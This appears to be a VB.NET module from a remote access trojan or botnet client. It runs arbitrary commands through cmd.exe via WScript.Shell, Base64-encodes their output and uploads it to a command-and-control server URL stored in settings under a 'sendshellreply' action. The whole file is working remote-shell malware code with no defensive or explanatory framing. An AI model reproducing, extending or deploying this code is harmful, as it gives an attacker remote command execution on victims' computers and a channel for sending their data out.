Imports System.Net
Imports System.Text

Module WinCMD
    Public Function ShellRun(sCmd As String) As String
        Dim oShell As Object = CreateObject("WScript.Shell")

        Dim oExec As Object = oShell.Exec(sCmd)
        Dim oOutput As Object = oExec.StdOut
        Dim s As String = ""
        Dim sLine As String = ""

        While Not oOutput.AtEndOfStream
            sLine = oOutput.ReadLine
            If sLine <> "" Then s &= sLine & vbCrLf
        End While

        Return s
    End Function
    Public Sub Run(command As String, ByRef mainWebClient As WebClient)
        Dim shellReply As String = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & command)))
        mainWebClient.UploadString(My.Settings.vpsurl, "clients.php?action=sendshellreply&actioncontent=" & shellReply)
    End Sub
End Module
